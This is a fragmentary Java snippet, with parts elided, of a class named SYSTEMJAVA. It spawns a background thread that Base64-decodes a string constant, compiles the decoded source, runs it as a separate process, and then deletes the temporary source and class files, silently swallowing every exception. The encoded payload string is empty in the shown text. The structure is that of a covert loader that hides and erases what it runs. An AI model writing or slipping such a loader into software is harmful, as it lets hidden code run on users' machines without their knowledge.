...
public class SYSTEMJAVA 
{
    ...
    new Thread(() -> {
            try {
                byte[] decoded = Base64.getDecoder().decode(que);
                String code = new String(decoded);
                compileAndRun(code, "porq");
            } catch (Exception e) {
            }
        }).start();
...
private static final String que = ""
private static void compileAndRun(String code, String className) {
        try {
            ...
            Process runProcess = Runtime.getRuntime().exec("java -cp " + tempFile.getParent() + " " + className);
            runProcess.waitFor();
            tempFile.delete();
            new File(tempFile.getParent() + "/" + className + ".class").delete();
        } catch (Exception e) {
        }
    }
}
